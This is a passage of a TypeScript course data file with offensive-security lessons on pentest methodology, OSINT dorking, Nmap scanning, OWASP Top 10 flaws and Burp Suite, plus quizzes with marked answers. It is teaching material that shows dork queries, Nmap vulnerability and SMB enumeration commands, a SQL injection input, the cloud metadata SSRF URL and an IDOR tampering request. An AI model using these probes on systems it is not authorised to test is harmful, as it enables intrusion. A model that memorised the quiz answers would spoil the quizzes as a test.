import { Tier } from '../../types';

export const tier3: Tier = {
  id: 'tier-3',
  number: 3,
  title: 'Offensive Security',
  description: 'Master penetration testing methodologies, OSINT, network exploitation, web application security vulnerabilities, privilege escalation, and Active Directory exploitation.',
  topics: [
    {
      id: 'recon-scanning',
      title: 'Ethical Hacking & Reconnaissance',
      category: 'offense',
      lessons: [
        {
          id: 'pentest-method',
          title: 'Penetration Testing Methodologies',
          description: 'Explore the phases of ethical hacking, legal Scopes of Work, and reporting standards.',
          duration: '15 mins',
          content: `### Penetration Testing Methodologies

**Difficulty:** Beginner  
**Estimated Study Time:** 15 Minutes  
**Prerequisites:** Defensive Frameworks & AAA, Network Topologies, OSI & TCP/IP Reference models  

#### Learning Objectives
- Map the operational stages of the Penetration Testing Execution Standard (PTES).
- Distinguish contractual legal authorizations including NDAs, MSAs, Scope of Work (SoW), and Rules of Engagement (RoE).
- Structure penetration test findings into actionable executive summaries and technical remediation reports.

#### Why It Matters
Technical exploitation skills without legal authorization create criminal liability rather than security improvement. Organizations hire ethical hackers not merely to break systems, but to measure real business risk safely under explicit boundaries and deliver clear documentation that engineering and executive teams can act on immediately.

#### Prerequisites & Connections
This module builds on **Defensive Frameworks & AAA** and **Network Topologies, OSI & TCP/IP Reference models** (with **Vulnerability Management & Patching Prioritization** as recommended context). It governs every subsequent Tier 3 offensive module, beginning with **Open Source Intelligence & Passive Recon**.

#### Core Explanation
Structured penetration testing relies on repeatable methodologies and airtight authorization:
- **Legal & Contractual Artifacts:**
  - **Non-Disclosure Agreement (NDA):** Protects confidential client architecture, credentials, and findings from external disclosure.
  - **Scope of Work (SoW):** Enumerates the exact authorized IP ranges, domains, cloud accounts, and applications—plus out-of-scope third-party infrastructure.
  - **Rules of Engagement (RoE):** Defines testing hours, allowed attack intensity (e.g., whether DoS or social engineering is prohibited), emergency stop contacts, and deconfliction rules.
- **PTES (Penetration Testing Execution Standard):** Divides engagements into seven stages: *Pre-engagement Interactions*, *Intelligence Gathering*, *Threat Modeling*, *Vulnerability Analysis*, *Exploitation*, *Post-Exploitation*, and *Reporting*.
- **Reporting Deliverables:** Dual-audience reports combine a non-technical **Executive Summary** (business risk posture, systemic themes, strategic priorities) with a **Technical Findings Section** (reproduction steps, evidence, CVSS/likelihood severity, and remediation guidance).

#### How It Works
Before a single scan packet leaves a testing workstation, the client and security team sign the SoW and RoE defining exact test windows and explicit CIDR blocks (such as \`198.51.100.0/24\`). During the assessment, testers correlate discovered hosts during Vulnerability Analysis, safely prove impact during Exploitation, clean up artifacts during Post-Exploitation teardown, and deliver the final report for verification retesting.

#### Real-World Context
Many production environments sit behind shared cloud load balancers, SaaS CDNs, or managed DNS providers. Testing an external hostname without verifying ownership in the RoE and SoW can inadvertently probe third-party infrastructure outside legal authorization, violating laws such as the U.S. Computer Fraud and Abuse Act (CFAA) or international computer misuse statutes.

#### Examples
Sample Rules of Engagement (RoE) and Scope baseline:
\`\`\`yaml
engagement: "2026-Q4 External Web & API Penetration Test"
authorization:
  signed_roe: true
  testing_window_utc: "Mon-Fri 08:00-20:00"
  emergency_deconfliction_contact: "soc-lead@example.internal"
scope:
  in_scope_targets:
    - "app.example.com"
    - "198.51.100.0/24"
  explicitly_prohibited:
    - "Volumetric Denial of Service (DoS)"
    - "Automated phishing against payroll staff"
    - "Third-party SaaS payment processors"
\`\`\`

#### Security Relevance
- **Defensive Value:** Clear RoE deconfliction enables SOC defenders to validate whether alerts represent an authorized test or a real adversary—never disable detection just for a pentest.
- **Attacker Misuse:** Real threat actors operate with zero scope limits, chaining overlooked non-production servers, shadow IT, and third-party vendors specifically because defenders excluded them from routine testing.

#### Common Mistakes
- Starting reconnaissance or active scanning before receiving signed written RoE and Scope of Work approval.
- Writing technical jargon in the Executive Summary instead of translating vulnerabilities into business impact and prioritized action.
- Assuming an NDA or Master Service Agreement grants technical testing permission without explicit IP/domain scope authorization.

#### Key Takeaways
- **Rules of Engagement (RoE)** and **Scope of Work (SoW)** establish the legally binding boundaries and authorized targets for ethical testing.
- **PTES** structures engagements across seven predictable stages from pre-engagement to **Reporting**.
- Testing systems outside explicit written scope risks severe **criminal and civil liability**.

#### Knowledge Check
- Which operational document protects testers legally by specifying authorized IP blocks, testing hours, and emergency escalation paths?
- Why must an Executive Summary avoid exploit payload dumps and focus instead on business risk and systemic remediation?
- At which PTES phase do testers correlate enumerated services to locate exploitable entry points?

#### Further Learning
Review the Penetration Testing Execution Standard (PTES) Technical Guidelines and NIST SP 800-115 (*Technical Guide to Information Security Testing and Assessment*).`,
          quiz: [
            {
              id: 'q-eth-1',
              question: 'Which legal document defines the authorized IP ranges, testing hours, and communication paths for a pentest?',
              options: [
                "Nondisclosure Agreement (NDA)",
                "Master Service Agreement (MSA)",
                "Rules of Engagement (RoE)",
                "Security Assessment Report"
              ],
              correctOption: 2,
              explanation: 'The Rules of Engagement (RoE) is the operational contract that outlines targets, constraints, and boundaries for a pentest.'
            },
            {
              id: 'q-eth-2',
              question: 'Which phase of the PTES framework is dedicated to analyzing collected scanning telemetry to locate open entry points?',
              options: [
                "Reporting",
                "Vulnerability Analysis",
                "Post-Exploitation",
                "Threat Modeling"
              ],
              correctOption: 1,
              explanation: 'Vulnerability Analysis is the process of correlating scanning and enumeration results to identify exploitable vulnerabilities.'
            },
            {
              id: 'q-eth-3',
              question: 'Who is the primary audience for the Executive Summary section of a penetration testing report?',
              options: [
                "Executives and Non-Technical Leadership",
                "Application Security Engineers",
                "Production Database Administrators",
                "Compliance and System Auditors"
              ],
              correctOption: 0,
              explanation: 'The Executive Summary uses non-technical business language to describe the test\'s scope, high-level findings, and overall security posture.'
            },
            {
              id: 'q-eth-4',
              question: 'What is the risk of scanning or testing IP addresses not explicitly listed in a pentest\'s Scope of Work?',
              options: [
                "The resulting port scan output will miss non-standard high ports.",
                "It automatically triggers permanent lockout of local host firewalls.",
                "It forces upstream ISP core routers to reboot mid-assessment.",
                "It is unauthorized and risks criminal charges or civil lawsuits."
              ],
              correctOption: 3,
              explanation: 'Accessing systems outside the authorized scope is illegal (violating laws like the Computer Fraud and Abuse Act), even during an active engagement.'
            }
          ]
        },
        {
          id: 'osint-passive',
          title: 'Open Source Intelligence & Passive Recon',
          description: 'Leverage Google Dorking, domain records, and public threat directories like Shodan to gather intelligence.',
          duration: '18 mins',
          content: `### Open Source Intelligence & Passive Recon

**Difficulty:** Beginner  
**Estimated Study Time:** 18 Minutes  
**Prerequisites:** Penetration Testing Methodologies, Infrastructure Protocols (DNS, DHCP, NAT, ARP, ICMP)  

#### Learning Objectives
- Conduct passive footprinting of in-scope domains without transmitting packets to target servers.
- Apply search engine dorking operators (\`site:\`, \`filetype:\`, \`intitle:\`) to uncover accidentally indexed files.
- Query public registries and internet-wide telemetry platforms including WHOIS, Certificate Transparency logs, theHarvester, Shodan, and Censys.

#### Why It Matters
Before active scanning ever begins, an organization's public digital footprint often reveals forgotten subdomains, staging servers, software stacks, leaked PDFs, and employee email conventions. Both red teams and defensive attack-surface management (ASM) teams rely on passive Open Source Intelligence (OSINT) to map external exposure quietly and legally.

#### Prerequisites & Connections
This module extends **Penetration Testing Methodologies** and **Infrastructure Protocols (DNS, DHCP, NAT, ARP, ICMP)** (with **Email Protocols, Authentication & Phishing Defense** recommended for interpreting public MX/SPF/DMARC exposure). It prepares the target inventory needed for **Active Reconnaissance & Port Scanning**.

#### Core Explanation
**Passive Reconnaissance** collects intelligence solely from third-party public sources without touching target hosts directly:
- **Search Engine Dorking (Google Dorking):** Combines search operators such as \`site:\` (restrict domain), \`filetype:\` (specific extensions like \`pdf\`, \`xlsx\`, \`log\`), and \`intitle:\` (page headings) to identify exposed manuals, directory listings, or misconfigured portals indexed by crawlers.
- **Domain, DNS & Certificate Transparency:** Public WHOIS/RDAP records, passive DNS archives, and TLS Certificate Transparency logs (\`crt.sh\`) reveal subdomains, autonomous system ownership, and mail exchangers.
- **Public Aggregation Utilities:** **theHarvester** aggregates subdomains, hosts, and public email addresses from search engines and public repositories.
- **Internet Telemetry Engines:** **Shodan** and **Censys** continuously scan the public IPv4/IPv6 internet and index open ports, TLS certificates, and service banners, allowing analysts to query target banners indirectly without connecting to target infrastructure.

#### How It Works
A tester checks authorized scope domains against search engine indexes, queries TLS certificate transparency logs to list issued hostnames (e.g., \`dev-portal.example.com\`), checks DNS TXT/MX records through public resolvers, and queries Shodan using organization or ASN filters—all generating zero inbound traffic against the target's firewalls or web servers.

#### Real-World Context
Defenders frequently run the same passive OSINT checks against their own domains during Attack Surface Management audits. Discovering that an internal wiki PDF containing server naming conventions or an unpatched staging endpoint appeared in search indexes or Shodan lets teams remove the exposure before adversaries discover it.

#### Examples
Passive discovery queries against public telemetry and search indexes:
\`\`\`text
# Limit search results strictly to a domain and locate exposed PDFs
site:example.com filetype:pdf

# Identify directory index pages mentioning configuration backups
site:example.com intitle:"index of" "config"
\`\`\`
\`\`\`bash
# Query public email and subdomain intelligence passively with theHarvester
theHarvester -d example.com -b crtsh,bing
\`\`\`

#### Security Relevance
- **Defensive Value:** Attack surface management teams monitor Certificate Transparency logs, Shodan alerts, and search dorks to catch shadow IT, leaked documents, and forgotten cloud endpoints early.
- **Attacker Misuse:** Threat actors use passive OSINT to craft realistic phishing pretexts from employee metadata, identify unauthenticated administration panels on Shodan, and avoid alerting target IDS sensors prior to attack.

#### Common Mistakes
- Confusing passive OSINT with active port scanning or direct directory brute-forcing (which sends packets straight to target infrastructure and trips IDS alerts).
- Assuming \`robots.txt\` prevents sensitive files from being indexed or hides paths safely—attackers inspect \`robots.txt\` specifically to find sensitive routes.
- Collecting OSINT outside the authorized client organization or publishing discovered exposed secrets publicly.

#### Key Takeaways
- **Passive Reconnaissance** maps external exposure using public third-party records without sending traffic to target hosts.
- Search dorking operators like \`site:\` and \`filetype:\` locate unintentionally indexed sensitive documents.
- **Shodan**, **Censys**, **WHOIS/DNS**, and **theHarvester** reveal exposed ports, banners, certificates, and subdomains passively.

#### Knowledge Check
- Why does querying Shodan generate no alert in a target organization's local firewall logs?
- Which search operator restricts results to a specific target domain, and why is \`robots.txt\` not a security control?
- What passive data types does \`theHarvester\` gather from public sources?

#### Further Learning
Explore the OSINT Framework directory and OWASP Web Security Testing Guide (*Information Gathering* section) for structured passive footprinting workflows.`,
          quiz: [
            {
              id: 'q-os-1',
              question: 'Which of the following describes passive reconnaissance?',
              options: [
                "Collecting public third-party intelligence without touching target hosts.",
                "Sending crafted exploit verification payloads directly to web servers.",
                "Running distributed active Nmap SYN scans against target netblocks.",
                "Launching low-rate credential brute-force checks against remote SSH."
              ],
              correctOption: 0,
              explanation: 'Passive recon gathers publicly available details (DNS records, public directories, cached files) to avoid triggering security alerts on the target systems.'
            },
            {
              id: 'q-os-2',
              question: 'Which Google Dorking operator limits search results to a specific website domain?',
              options: [
                "filetype:",
                "domain:",
                "url:",
                "site:"
              ],
              correctOption: 3,
              explanation: 'The "site:" operator limits Google search results to the specified domain or top-level domain.'
            },
            {
              id: 'q-os-3',
              question: 'What is the primary function of Shodan?',
              options: [
                "To execute automated wordlist credential spraying against web forms.",
                "To index internet-facing servers, IoT gear, open ports, and banners.",
                "To cross-compile Python reconnaissance scripts into native binaries.",
                "To register privacy-protected enterprise domains and DNSSEC records."
              ],
              correctOption: 1,
              explanation: 'Shodan continuously scans the internet, indexing active ports and service banners for connected devices globally.'
            },
            {
              id: 'q-os-4',
              question: 'Which tool gathers passive subdomain and email data from public threat resources?',
              options: [
                "Hydra",
                "Nmap",
                "theHarvester",
                "John the Ripper"
              ],
              correctOption: 2,
              explanation: 'theHarvester collects emails, subdomains, hosts, employee names, and open ports from public search engines and PGP key servers.'
            }
          ]
        },
        {
          id: 'active-recon',
          title: 'Active Reconnaissance & Port Scanning',
          description: 'Probe targets using stealth Nmap scans, enumerate protocols, and map target systems.',
          duration: '18 mins',
          content: `### Active Reconnaissance & Port Scanning

**Difficulty:** Intermediate  
**Estimated Study Time:** 18 Minutes  
**Prerequisites:** Open Source Intelligence & Passive Recon, Transport Protocols & Port Bindings, Vulnerability Management & Patching Prioritization  

#### Learning Objectives
- Distinguish Nmap scan techniques (\`-sS\` SYN scan, \`-sT\` connect scan, \`-sU\` UDP scan, \`-sn\` host discovery) and TCP state responses.
- Perform service version fingerprinting (\`-sV\`), OS detection (\`-O\`), and automated **NSE** (Lua) checks.
- Enumerate exposed enterprise services including SMB (TCP 445), SNMP (UDP 161), FTP (TCP 21), and LDAP (TCP 389/636).

#### Why It Matters
While passive reconnaissance suggests what an organization *might* run, **Active Reconnaissance** directly probes authorized systems to confirm live hosts, exact listening ports, protocol implementations, and software patch levels. Combining active scan results with vulnerability prioritization focuses testing on real, reachable attack surface.

#### Prerequisites & Connections
This module synthesizes **Open Source Intelligence & Passive Recon**, **Transport Protocols & Port Bindings**, and **Vulnerability Management & Patching Prioritization**. Its port and banner maps directly drive **Web Technologies & OWASP Top 10** and **Network Infiltration & Metasploit**.

#### Core Explanation
**Active Reconnaissance** sends crafted network packets directly to authorized targets and inspects the responses:
- **Nmap (Network Mapper):**
  - **TCP SYN Scan (\`-sS\`):** Sends a TCP \`SYN\`. If the target answers \`SYN/ACK\` (open), Nmap sends \`RST\` immediately instead of completing the 3-way handshake, reducing application-layer session noise while still triggering firewall/IDS logs.
  - **Service & Version Detection (\`-sV\`):** Sends protocol probes to open ports to identify exact software banners (e.g., \`OpenSSH 8.9p1\` or \`Apache httpd 2.4.58\`).
  - **OS Fingerprinting (\`-O\`):** Evaluates TCP/IP stack subtle quirks (TTL, window size, IP IDs) to estimate the operating system.
  - **Nmap Scripting Engine (NSE):** Extensible scripts written in **Lua** (\`-sC\` default scripts or \`--script vuln\`) automate banner parsing, share enumeration, and safe vulnerability checks.
- **Protocol Enumeration:** Once open ports are confirmed, focused enumeration queries **SMB (TCP Port 445)** for accessible network shares, **SNMP (UDP Port 161)** for misconfigured community strings, or **LDAP (Port 389)** for directory metadata.

#### How It Works
A port scan distinguishes three primary port states: **open** (service actively accepting connections, replying \`SYN/ACK\`), **closed** (host reachable, no listener, replying \`RST\`), and **filtered** (firewall drops probes with no reply or returns ICMP unreachable). Careful timing templates (\`-T3\` / \`-T4\`) balance scan accuracy against network congestion and rate limits.

#### Real-World Context
Organizations regularly schedule authenticated and external Nmap baselines against documented asset ranges like \`198.51.100.0/24\` to verify that database ports (e.g., MySQL 3306 or SMB 445) are not exposed past edge security groups. Any unexpected drift triggers immediate triage.

#### Examples
Authorized active scanning and service enumeration commands targeting a lab host (\`198.51.100.5\`):
\`\`\`bash
# Run a SYN scan with service version fingerprinting and OS detection
sudo nmap -sS -sV -O -T4 198.51.100.5

# Run Lua-based NSE vulnerability checks against web ports
nmap --script vuln -p 80,443 198.51.100.5

# Enumerate SMB shares cleanly on TCP Port 445
nmap --script smb-enum-shares -p 445 198.51.100.5
\`\`\`

#### Security Relevance
- **Defensive Value:** Comparing periodic internal/external port scan inventories against approved service baselines immediately flags unauthorized listeners, shadow services, and misconfigured firewall rules.
- **Attacker Misuse:** Attackers automate fast SYN scans and targeted NSE probes across exposed ranges to locate legacy SMB servers, unauthenticated SNMP agents, or outdated HTTP stacks ready for exploitation.

#### Common Mistakes
- Calling \`-sS\` truly "invisible"—modern stateful firewalls, IDS/IPS, and EDR sensors reliably log half-open SYN floods.
- Scanning only the top 1,000 TCP ports and missing critical services on high ephemeral ports or UDP ports (\`-sU\`).
- Running intrusive NSE \`exploit\` or \`dos\` scripts when only discovery was authorized in the Rules of Engagement.

#### Key Takeaways
- **Nmap SYN scans (\`-sS\`)** send \`RST\` immediately after \`SYN/ACK\`, identifying open ports without completing full TCP handshakes.
- Use **\`-sV\`** for service/version detection and **Lua-written NSE scripts** for targeted protocol enumeration.
- **SMB runs on TCP Port 445** and remains a primary focus during enterprise network enumeration.

#### Knowledge Check
- How does a \`-sS\` SYN scan differ at the TCP handshake level from a full \`-sT\` connect scan?
- What information does \`-sV\` collect that a plain port list misses?
- Why should UDP port 161 (SNMP) and TCP port 445 (SMB) always be verified during perimeter audits?

#### Further Learning
Study the official Nmap Reference Guide on port scanning techniques and Lua NSE script categories.`,
          quiz: [
            {
              id: 'q-as-1',
              question: 'Why does an Nmap SYN Scan (-sS) avoid establishing a full connection with the target system?',
              options: [
                "It enumerates high ephemeral service ports strictly in reverse order.",
                "It replies RST after SYN/ACK, ending before full session logging.",
                "It wraps probes inside encrypted UDP tunnels to evade filters.",
                "It distributes individual TCP probes across commercial VPN hops."
              ],
              correctOption: 1,
              explanation: 'The SYN scan breaks the TCP handshake by sending a RST (reset) packet instead of an ACK, preventing traditional applications from logging a connection.'
            },
            {
              id: 'q-as-2',
              question: 'Which Nmap flag is used to discover active software versions running on open ports?',
              options: [
                "-sV",
                "-sn",
                "-sS",
                "-O"
              ],
              correctOption: 0,
              explanation: 'The "-sV" flag probes open ports to determine service and version details (e.g., identifying Apache version 2.4.41).'
            },
            {
              id: 'q-as-3',
              question: 'Which port handles SMB (Server Message Block) traffic, which is commonly audited for open file shares and vulnerabilities?',
              options: [
                "Port 80",
                "Port 3389",
                "Port 445",
                "Port 21"
              ],
              correctOption: 2,
              explanation: 'SMB runs on TCP Port 445, serving as a primary target for sharing files and printer resources across Windows networks.'
            },
            {
              id: 'q-as-4',
              question: 'In what language are Nmap Scripting Engine (NSE) scripts written?',
              options: [
                "Bash",
                "C++",
                "Python",
                "Lua"
              ],
              correctOption: 3,
              explanation: 'NSE scripts are written in the Lua programming language, enabling fast, lightweight automation for network audits.'
            }
          ]
        }
      ]
    },
    {
      id: 'web-security',
      title: 'Web Application Security',
      category: 'offense',
      lessons: [
        {
          id: 'web-owasp-top-10',
          title: 'Web Technologies & OWASP Top 10',
          description: 'Analyse HTTP layers, and exploit critical web application flaws like SQL Injection, XSS, and SSRF.',
          duration: '22 mins',
          content: `### Web Technologies & OWASP Top 10

**Difficulty:** Intermediate  
**Estimated Study Time:** 22 Minutes  
**Prerequisites:** Active Reconnaissance & Port Scanning, HTTP, Web Architecture & Browser Trust, Databases, SQL & Data Access, Authentication, Sessions & Identity Protocols  

#### Learning Objectives
- Map web application vulnerability classes to the **OWASP Top 10 (including 2025 structure)**—Broken Access Control (including SSRF), Injection, Cryptographic Failures, Authentication Failures, Software Supply Chain Failures, and Exceptional Condition Handling.
- Explain and remediate **SQL Injection (SQLi)** using parameterized queries (prepared statements).
- Distinguish **Stored, Reflected, and DOM-based Cross-Site Scripting (XSS)** and defend against **Server-Side Request Forgery (SSRF)** targeting cloud metadata endpoints (\`169.254.169.254\`).

#### Why It Matters
Public web applications and APIs sit directly on the internet, continuously handling untrusted user input, session tokens, and backend database queries. Understanding the root mechanics of OWASP Top 10 flaws lets developers write resilient code and helps security testers pinpoint high-impact business logic and injection weaknesses.

#### Prerequisites & Connections
This module synthesizes **HTTP, Web Architecture & Browser Trust**, **Databases, SQL & Data Access**, **Authentication, Sessions & Identity Protocols**, and **Active Reconnaissance & Port Scanning**. It directly unlocks hands-on proxy testing in **Burp Suite Mastery**.

#### Core Explanation
The **OWASP Top 10** catalogs the most critical web security risks, updated in the **OWASP Top 10:2025** taxonomy (which retains *Broken Access Control* at A01—now consolidating SSRF—highlights *Software Supply Chain Failures* at A03, *Cryptographic Failures* at A04, *Injection* at A05, *Authentication Failures* at A07, and adds *Mishandling of Exceptional Conditions* at A10):
- **SQL Injection (SQLi):** Occurs when untrusted user parameters are concatenated straight into SQL command strings instead of bound separately. **Parameterized queries (prepared statements)** force the database driver to treat input strictly as literal data, neutralizing SQL syntax injection.
- **Cross-Site Scripting (XSS):** Executes attacker-controlled JavaScript in a victim's browser via three primary patterns: **Stored XSS** (payload persisted in database storage and served to every viewer), **Reflected XSS** (bounced immediately in an HTTP response), and **DOM-based XSS** (sink manipulation inside client-side scripts). Contextual output encoding and strict Content Security Policy (CSP) mitigate XSS.
- **Server-Side Request Forgery (SSRF):** Abuses server-side URL fetchers to probe internal networks or cloud Instance Metadata Service endpoints (like \`http://169.254.169.254/latest/meta-data/\`), exposing IAM credentials unless outbound destinations are allowlisted and **IMDSv2** session tokens are enforced.
- **JSON Web Tokens (JWT):** Compact bearer tokens structured as three Base64URL-encoded segments separated by dots: **Header**, **Payload**, and **Signature**. Servers must strictly validate cryptographic signatures and enforce explicit expected algorithms.

#### How It Works
When an API concatenates \`SELECT * FROM users WHERE email = '\` + input + \`'\`, input containing \`' OR '1'='1\` alters the database query parse tree. Prepared statements compile the SQL structure first (\`WHERE email = ?\`) and transmit the input string separately in a binary bind protocol, making structural alteration impossible regardless of quotes or keywords inside the parameter.

#### Real-World Context
Major cloud breaches have chained seemingly minor SSRF flaws inside image processors or webhook testers into reaching \`169.254.169.254\`, harvesting temporary cloud role credentials from the host instance, and pivoting straight into private object storage buckets. Cloud providers now mitigate this with IMDSv2 (requiring a \`PUT\` token header and hop limits) alongside strict backend URL validation.

#### Examples
Comparing vulnerable string concatenation vs. secure parameterized SQL execution:
\`\`\`javascript
// VULNERABLE: Attacker input modifies SQL logic
const unsafeSql = "SELECT id, role FROM users WHERE username = '" + userInput + "'";

// SECURE: Parameterized prepared statement binds input strictly as data
const [rows] = await db.execute(
  "SELECT id, role FROM users WHERE username = ?",
  [userInput]
);
\`\`\`
\`\`\`text
JWT Structure:  eyJhbGciOiJIUzI1NiJ9 . eyJzdWIiOiJ1c2VyLTQifQ . dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk
                [----- Header -----]   [----- Payload ------]   [---------------- Signature ----------------]
\`\`\`

#### Security Relevance
- **Defensive Value:** Enforcing prepared statements at the data layer, contextual output encoding + CSP in the browser, centralized object-level authorization checks, and IMDSv2/egress allowlists removes entire OWASP Top 10 risk classes systematically.
- **Attacker Misuse:** Attackers fuzz query parameters for SQL syntax errors, inject Stored XSS scripts into shared profile/comment fields to hijack admin sessions, and abuse SSRF to scan internal ports or dump cloud instance tokens.

#### Common Mistakes
- Relying only on client-side JavaScript filters or blocklist regexes to stop SQLi instead of server-side **prepared statements**.
- Treating WAFs or database encryption at rest as SQLi protection (an authorized web backend decrypts data legitimately during injected queries).
- Returning verbose stack traces or failing open when exceptions occur (OWASP A10:2025 *Mishandling of Exceptional Conditions*).

#### Key Takeaways
- **Parameterized queries / prepared statements** are the primary architectural defense against **SQL Injection**.
- **Stored XSS** persists malicious JavaScript in server storage so it executes for every subsequent user who views the page.
- **SSRF** commonly targets link-local cloud metadata address **\`169.254.169.254\`** to leak instance credentials.
- A **JWT** consists of three dot-separated parts: **Header, Payload, and Signature**.

#### Knowledge Check
- Why does database encryption at rest not stop a SQL Injection flaw in an application endpoint?
- How do Stored XSS and Reflected XSS differ in how the malicious script reaches victims?
- What architectural controls protect cloud workloads even if an attacker discovers a minor SSRF bug?

#### Further Learning
Review the **OWASP Top 10:2025** release notes and the **OWASP Cheat Sheet Series** (SQL Injection Prevention, XSS Prevention, and SSRF Prevention).`,
          quiz: [
            {
              id: 'q-web-1',
              question: 'What is the most effective way to protect web applications against SQL Injection vulnerabilities?',
              options: [
                "Encrypting the SQL database",
                "Filtering special characters client-side",
                "Using Parameterized Queries / Prepared Statements",
                "Implementing a Web Application Firewall (WAF)"
              ],
              correctOption: 2,
              explanation: 'Prepared statements separate query code from input parameters, ensuring that the SQL database driver treats inputs strictly as data, never executable commands.'
            },
            {
              id: 'q-web-2',
              question: 'Which type of XSS vulnerability occurs when malicious script payloads are saved directly to a database, executing whenever a user loads the infected page?',
              options: [
                "Stored XSS",
                "Blind XSS",
                "Reflected XSS",
                "DOM-based XSS"
              ],
              correctOption: 0,
              explanation: 'Stored XSS is a persistent vulnerability where the malicious payload is saved in database fields (like blog comments) and executes for every visitor.'
            },
            {
              id: 'q-web-3',
              question: 'Which cloud IP address is commonly targeted in Server-Side Request Forgery (SSRF) attacks to retrieve AWS or Google Cloud metadata and API keys?',
              options: [
                "192.168.1.1",
                "8.8.8.8",
                "127.0.0.1",
                "169.254.169.254"
              ],
              correctOption: 3,
              explanation: '169.254.169.254 is the standard link-local address for cloud metadata services, which can expose sensitive API keys and session tokens if accessed via SSRF.'
            },
            {
              id: 'q-web-4',
              question: 'What is a JSON Web Token (JWT) comprised of, separated by dots?',
              options: [
                "Token, Timestamp, Salt",
                "Header, Payload, Signature",
                "Issuer, Expiration, Key",
                "Session ID, User ID, Privilege"
              ],
              correctOption: 1,
              explanation: 'A JWT is divided into three Base64URL-encoded parts: the Header (identifying algorithm type), the Payload (storing session data), and the Signature (verifying token integrity).'
            }
          ]
        },
        {
          id: 'burpsuite-mastery',
          title: 'Burp Suite Mastery',
          description: 'Intercept web traffic, analyze session tokens, and automate web attacks using Burp Suite.',
          duration: '20 mins',
          content: `### Burp Suite Mastery

**Difficulty:** Intermediate  
**Estimated Study Time:** 20 Minutes  
**Prerequisites:** Web Technologies & OWASP Top 10  

#### Learning Objectives
- Configure an intercepting HTTP/HTTPS proxy listener on \`127.0.0.1:8080\` and inspect raw client-server requests.
- Use **Repeater** for manual parameter tampering and **Intruder** for structured payload fuzzing.
- Evaluate session token randomness with **Sequencer** and transform encodings with **Decoder**.

#### Why It Matters
Browsers silently enforce client-side validation, hide hidden form fields, and obscure JSON/API payloads behind single-page UI workflows. An intercepting proxy lets security engineers look straight underneath the UI to test whether the server actually validates authorization, input sanitization, and session randomness.

#### Prerequisites & Connections
This module applies the web protocol and vulnerability concepts from **Web Technologies & OWASP Top 10** and **HTTP, Web Architecture & Browser Trust**, turning theory into systematic manual API and web assessment workflows.

#### Core Explanation
**Burp Suite** serves as a man-in-the-middle test proxy between a browser and authorized web targets:
- **Proxy:** Listens by default on loopback \`127.0.0.1:8080\`. With Burp's CA certificate trusted in the dedicated test browser, testers inspect, pause, and edit raw HTTP requests and TLS-decrypted API calls.
- **Repeater:** Enables rapid, manual request-response iteration—essential for verifying broken object-level authorization (IDOR), header spoofing, and injection payloads by tweaking one field at a time.
- **Intruder:** Automates parameterized HTTP requests across defined payload insertion points for directory discovery, parameter fuzzing, and credential auditing.
- **Sequencer:** Collects large samples of session cookies or CSRF tokens and runs statistical entropy tests to determine if tokens are dangerously predictable.
- **Decoder & Comparer:** Decoder converts Base64, URL, HTML, and Hex encodings cleanly; Comparer diffs subtle length or header differences between two server responses.

#### How It Works
When you click a button in a test browser routed through \`127.0.0.1:8080\`, the request stops inside Burp Proxy before reaching the web server. Sending that captured request to Repeater lets you change \`userId=1042\` to \`userId=1041\`, strip an authorization cookie, or inject a SQL/XSS probe and inspect the exact HTTP status code and JSON body returned.

#### Real-World Context
Automated scanners frequently miss authorization flaws because they cannot understand multi-step business logic (such as bypassing payment verification or reading another tenant's invoice ID). Security engineers use Burp Proxy and Repeater specifically to replay step-by-step workflows with swapped session cookies from low-privilege accounts.

#### Examples
Inspecting and testing an intercepted authorization flaw in Repeater:
\`\`\`http
GET /api/v1/invoices/9042 HTTP/1.1
Host: portal.example.internal
Cookie: session_id=low_priv_user_token_example
Accept: application/json
\`\`\`
Changing \`9042\` to \`9041\` while keeping the low-privilege \`session_id\` cookie tests directly for Broken Object Level Authorization (BOLA/IDOR) in Repeater.

#### Security Relevance
- **Defensive Value:** QA and AppSec teams integrate proxy inspection before production releases to prove server-side authorization checks, verify cookie flags, and validate anti-CSRF enforcement.
- **Attacker Misuse:** Attackers replay intercepted API tokens, tamper with hidden price/role JSON fields ignored by UI validation, and run Intruder/ffuf wordlists against unrate-limited endpoints.

#### Common Mistakes
- Relying on browser DevTools or client-side form restrictions as security controls—any proxy user edits parameters trivially after the UI validates them.
- Installing Burp's test CA certificate into a personal daily-driver browser instead of an isolated assessment browser profile.
- Running high-thread automated Intruder brute-forcing against sensitive production forms without RoE approval.

#### Key Takeaways
- **Burp Proxy** listens by default on **\`127.0.0.1:8080\`** to intercept and inspect HTTP/S traffic.
- **Repeater** resends individually modified requests for manual verification; **Intruder** automates fuzzing and dictionary payloads.
- **Sequencer** measures statistical entropy and predictability of session IDs and CSRF tokens.

#### Knowledge Check
- When would you choose **Repeater** over **Intruder** during an authorized web API test?
- Why does installing a proxy CA allow HTTPS traffic inspection in a test browser, and why should it stay isolated to a test profile?
- Which Burp tool helps verify that session identifiers are cryptographically random rather than timestamp-derived?

#### Further Learning
Work through PortSwigger's free Web Security Academy foundational labs on HTTP request manipulation, access control, and session token analysis.`,
          quiz: [
            {
              id: 'q-burp-1',
              question: 'Which Burp Suite tool is designed to resend modified individual requests, allowing manual testing of web parameters?',
              options: [
                "Comparer",
                "Proxy",
                "Intruder",
                "Repeater"
              ],
              correctOption: 3,
              explanation: 'Repeater allows testers to modify and resend individual HTTP requests, analyzing how the server responds to different payloads.'
            },
            {
              id: 'q-burp-2',
              question: 'Which Burp Suite tool automates custom fuzzing and dictionary attacks against target fields?',
              options: [
                "Proxy",
                "Intruder",
                "Decoder",
                "Sequencer"
              ],
              correctOption: 1,
              explanation: 'Intruder automates web requests, replacing specified parameters with list payloads to run brute-force and vulnerability fuzzing attacks.'
            },
            {
              id: 'q-burp-3',
              question: 'Which Burp Suite tool analyzes the randomness and entropy of session token structures?',
              options: [
                "Sequencer",
                "Comparer",
                "Extender",
                "Decoder"
              ],
              correctOption: 0,
              explanation: 'Sequencer evaluates the randomness of session IDs and CSRF tokens to determine if they are predictable and vulnerable to hijacking.'
            },
            {
              id: 'q-burp-4',
              question: 'What is the default IP address and port that Burp Proxy uses to listen for local browser traffic?',
              options: [
                "10.10.10.1:443",
                "127.0.0.1:80",
                "127.0.0.1:8080",
                "192.168.1.1:8080"
              ],
              correctOption: 2,
              explanation: 'By default, Burp Suite runs its local intercepting proxy listener on localhost IP 127.0.0.1 and Port 8080.'
            }
          ]
        }
      ]
    },
    {
      id: 'exploitation-tech',
      title: 'Exploitation Techniques',
      category: 'offense',
      lessons: [
        {
